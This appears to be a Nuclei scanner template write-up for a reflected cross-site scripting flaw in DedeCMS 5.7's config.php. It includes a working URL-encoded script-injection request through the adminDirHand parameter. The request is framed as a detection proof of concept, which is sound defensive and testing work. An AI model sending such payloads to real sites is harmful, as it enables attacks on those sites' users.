# Nuclei Template: DedeCMS 5.7 - Cross-Site Scripting
**Template ID:** dedecms-config-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`dedecms-config-xss.yaml`)

## Vulnerability Information & PoC

## Description
DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.zilyun.com/8665.html
- https://www.60ru.com/161.html
- https://www.cnblogs.com/milantgh/p/3615853.html
